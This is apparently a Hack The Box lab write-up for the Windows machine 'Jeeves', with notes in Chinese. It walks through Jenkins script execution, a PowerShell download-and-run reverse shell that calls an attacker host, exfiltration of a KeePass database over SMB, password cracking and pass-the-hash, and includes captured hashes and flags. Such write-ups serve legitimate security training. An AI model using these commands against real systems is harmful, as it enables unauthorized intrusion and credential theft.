###### tags: `Hack the box` `HTB` `Medium` `Windows`

# Jeeve
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.228.112 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.228.112:80
Open 10.129.228.112:135
Open 10.129.228.112:445
Open 10.129.228.112:50000

PORT      STATE SERVICE      REASON  VERSION
80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```

ffuf掃`http://10.129.228.112:50000`
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://10.129.228.112:50000/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 357ms]
```

前往`http://10.129.228.112:50000/askjeeves/`，點`create new jobs`->`Freesyle Project`->`Build Triggers中 Build Environment`->`Execute Windows batch command`->`Save`->`左邊Build Now`
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp445

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.65/oneliner.ps1'); oneliner.ps1"
```

等反彈後在`C:\Users\kohsuke\DEsktop`
```
PS C:\Users\kohsuke\DEsktop> cat user.txt
e3232272596fb47950d59c4cf1e7066a
```

找`keepass`，把它拿下來
```
PS C:\Users\Public\Documents> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx

┌──(kali㉿kali)-[~/htb]
└─$ impacket-smbserver -smb2support -user user -password user share .

PS C:\Users\Public\Documents> net use \\10.10.14.65 user /u:user
PS C:\Users\Public\Documents> copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10.14.65\share\CEH.kdbx
```

破他的hash，用`moonshine1`登入之後查看`0. Backup stuff`可以得`NTLM hash`
```
┌──(kali㉿kali)-[~/htb]
└─$ john keepass.hash --wordlist=/home/kali/rockyou.txt

moonshine1       (CEH)

┌──(kali㉿kali)-[~/htb]
└─$ kpcli --kdb=CEH.kdbx
Provide the master password: moonshine1


kpcli:/> ls
=== Groups ===
CEH/
kpcli:/> cd CEH
kpcli:/CEH> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

kpcli:/CEH> show 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes:
```

用[Pass the NTLM hash](https://github.com/byt3bl33d3r/pth-toolkit/tree/master)，在`C:\Users\Administrator\Desktop`得root.txt
```
┌──(kali㉿kali)-[~/htb/pth-toolkit]
└─$ pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.129.221.115 cmd

C:\Windows\system32>whoami
cjeeves\administrator

C:\Users\Administrator\Desktop>dir /R
dir /R

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,649,366,528 bytes free

C:\Users\Administrator\Desktop>powershell Get-Content -Path "hm.txt" -Stream "root.txt"
afbc5bd4b615a60648cec41c6ac92530
```